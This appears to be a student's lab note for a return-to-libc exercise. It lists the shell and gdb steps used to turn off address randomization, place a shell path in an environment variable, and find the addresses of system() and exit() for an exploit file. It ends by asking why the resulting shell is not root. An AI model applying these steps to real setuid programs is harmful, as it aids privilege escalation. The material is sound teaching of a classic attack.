# return-to-libc

### Note on Preparation

```bash
sudo mv /bin/sh /bin/sh.original
sudo ln -s /bin/zsh /bin/sh
export MYSHELL=/bin/sh
make randomoff
```

run showesh to show MYSHELL address
```bash
./showsh
$ bffffe8a
```

0xbffffe8a is address of MYSHELL to be filled in.

Run gdb to get address of system() and exit()
```bash
gdb retlib
(gdb) b main
(gdb) r
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e5f430 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e52fb0 <exit>
```

Fill above two adresses in exploit.c

run make to generate all files
```bash
make
```

### Result

sh is invoked, but not as root user. Why?
